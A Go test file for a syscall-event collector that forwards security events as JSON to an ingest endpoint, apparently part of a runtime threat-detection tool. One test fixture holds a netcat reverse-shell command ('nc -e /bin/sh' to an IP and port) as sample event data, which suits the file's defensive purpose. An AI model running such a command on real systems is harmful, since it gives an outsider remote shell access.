package main

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

func TestCollectorExportEvent(t *testing.T) {
	receivedEvent := SyscallEvent{}
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/ingest" {
			t.Errorf("Expected path /ingest, got %s", r.URL.Path)
		}
		if r.Header.Get("Content-Type") != "application/json" {
			t.Errorf("Expected Content-Type application/json, got %s", r.Header.Get("Content-Type"))
		}
		json.NewDecoder(r.Body).Decode(&receivedEvent)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status":"success"}`))
	}))
	defer ts.Close()

	collector := NewCollector(CollectorConfig{
		AIBrainURL: ts.URL,
		HTTPClient: ts.Client(),
	})

	evt := SyscallEvent{
		ID:          "evt-123",
		Timestamp:   time.Now(),
		EventType:   "exec",
		Namespace:   "prod",
		PodName:     "payment-service-5999bbfb59-9xyz8",
		ContainerID: "docker://12345",
		BinaryPath:  "/usr/bin/nc",
		CommandArgs: []string{"nc", "-e", "/bin/sh", "10.0.0.1", "4444"},
		Syscall:     "sys_execve",
		PID:         1042,
		UID:         0,
	}

	err := collector.ExportEvent(context.Background(), evt)
	if err != nil {
		t.Fatalf("Expected no error, got %v", err)
	}

	if receivedEvent.ID != evt.ID {
		t.Errorf("Expected ID %s, got %s", evt.ID, receivedEvent.ID)
	}
	if receivedEvent.BinaryPath != evt.BinaryPath {
		t.Errorf("Expected BinaryPath %s, got %s", evt.BinaryPath, receivedEvent.BinaryPath)
	}
}

func TestCollectorCaptureAndStart(t *testing.T) {
	processed := make(chan bool, 1)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		processed <- true
	}))
	defer ts.Close()

	collector := NewCollector(CollectorConfig{
		AIBrainURL: ts.URL,
		HTTPClient: ts.Client(),
	})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go collector.Start(ctx)

	evt := SyscallEvent{
		ID:        "evt-456",
		EventType: "network",
		Syscall:   "sys_connect",
	}

	collector.CaptureEvent(evt)

	select {
	case <-processed:
		// Success
	case <-time.After(2 * time.Second):
		t.Fatal("Timed out waiting for event processing")
	}
}
